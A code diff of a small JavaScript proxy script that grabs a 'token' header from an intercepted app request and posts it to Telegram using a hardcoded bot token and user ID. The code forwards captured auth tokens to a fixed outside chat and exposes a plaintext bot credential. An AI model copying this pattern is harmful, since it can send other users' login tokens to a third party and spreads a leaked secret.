@@ -7,7 +7,7 @@
 const $ = new Env("qngywxck")
 
 let token = $request.headers.token
-let ck = `export eytokenlist="${token}"
+let ck = token
 let TG_USER_ID = 474516302
 let TG_BOT_TOKEN = '5337071074:AAEUGMdEd_Jjkqtr9zTANL1U4N55BO9nroE'
 const timeout = 15000;
@@ -22,18 +22,12 @@ const options = {
 }
 $.post(options, (err, resp, data) => {
     try {
-        if (err) {
-            $.msg("TG提交失败", `${ck}`)
-            console.log(err);
-        } else {
-            data = JSON.parse(data);
-            if (data.ok) {
-                $.msg("TG提交成功", `ok`)
-                console.log('Telegram发送通知消息成功🎉。\n')
-            } else  {
-                $.msg("TG提交失败", `error`)
-                console.log(data);
-            }
+        data = JSON.parse(data);
+        if (data.ok) {
+            $.msg("TG提交成功", `${ck}`)
+            console.log('Telegram发送通知消息成功🎉。\n')
+        } else  {
+            $.msg("TG提交失败", `error`)
         }
     } catch (e) {
         $.msg("TG提交失败", `error`)
